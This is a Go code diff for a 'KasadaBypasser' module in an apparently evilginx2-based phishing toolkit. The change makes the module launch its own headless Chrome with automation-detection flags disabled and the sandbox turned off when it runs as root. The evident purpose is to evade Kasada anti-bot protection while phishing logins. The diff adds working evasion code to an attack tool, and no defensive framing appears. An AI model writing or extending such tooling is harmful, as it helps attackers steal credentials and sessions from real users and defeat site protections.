@@ -4,12 +4,14 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/input"
+	"github.com/go-rod/rod/lib/launcher"
 	"github.com/go-rod/rod/lib/proto"
 	"github.com/kgretzky/evilginx2/log"
 )
@@ -38,20 +40,25 @@ type loginRequestBody struct {
 	Corrid   int    `json:"corrid,omitempty"`
 }
 
-// Launch connects to the headless browser instance started by the main process.
-// It reuses the same Chrome debug port (9222) as GoogleBypasser.
+// Launch starts a fresh Chrome instance for Kasada bypass
+// UPDATED: Now uses go-rod launcher like GoogleBypasser (no port 9222 dependency)
 func (k *KasadaBypasser) Launch() error {
 	log.Important("[KasadaBypasser] 🚀 Starting Kasada bypass sequence...")
-	log.Debug("[KasadaBypasser]: Connecting to browser on port 9222...")
+	log.Debug("[KasadaBypasser]: Launching fresh Chrome instance...")
 
-	// Reuse the getWebSocketDebuggerURL function from evilpuppet.go
-	wsURL, err := getWebSocketDebuggerURL()
-	if err != nil {
-		log.Error("[KasadaBypasser]: ❌ Failed to get WebSocket debugger URL: %v", err)
-		log.Error("[KasadaBypasser]: Make sure Chrome is running with --remote-debugging-port=9222")
-		return err
+	l := launcher.New().
+		Headless(k.isHeadless).
+		Set("disable-blink-features", "AutomationControlled").
+		Set("disable-infobars", "").
+		Set("window-size", "1920,1080")
+
+	// Run as root if needed (for Docker containers)
+	if os.Geteuid() == 0 {
+		l = l.NoSandbox(true)
 	}
-	log.Debug("[KasadaBypasser]: ✅ Got WebSocket URL: %s", wsURL[:50]+"...")
+
+	wsURL := l.MustLaunch()
+	log.Debug("[KasadaBypasser]: ✅ Chrome launched at: %s", wsURL[:50]+"...")
 
 	k.browser = rod.New().ControlURL(wsURL)
 	if k.slowMotionTime > 0 {
@@ -66,7 +73,7 @@ func (k *KasadaBypasser) Launch() error {
 	log.Debug("[KasadaBypasser]: ✅ Connected to Chrome browser")
 
 	k.page = k.browser.MustPage()
-	log.Important("[KasadaBypasser] ✅ Browser connection established, new page created")
+	log.Important("[KasadaBypasser] ✅ Browser launched, new page created")
 	return nil
 }
 
@@ -287,6 +294,14 @@ func (k *KasadaBypasser) normalizeHeaderName(name string) string {
 		return proper
 	}
 	return name
+}
+
+// Close cleans up the browser instance
+func (k *KasadaBypasser) Close() {
+	if k.browser != nil {
+		k.browser.MustClose()
+		log.Debug("[KasadaBypasser] Browser closed")
+	}
 }
 
 // GetCapturedHeaders returns the captured Kasada headers for inspection.
